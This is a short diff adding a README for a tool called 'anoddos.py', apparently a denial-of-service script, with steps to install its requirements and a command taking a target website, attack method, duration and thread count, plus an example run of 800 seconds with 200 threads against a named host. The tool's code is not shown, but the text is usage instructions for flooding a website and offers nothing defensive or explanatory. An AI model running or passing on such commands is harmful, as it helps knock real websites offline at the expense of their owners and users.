@@ -1,0 +1,11 @@
+ Install:
+
+1/ Install pip in my os
+2/ Open cmd and enter command: pip install -r requirements.txt
+3/ python anoddos.py --target <website> --method <method> --time <time> --thread <theard>
+
+ex: python anoddos.py --target anony.ik --method HTTP --time 800 --thread 200
+
+
+
+
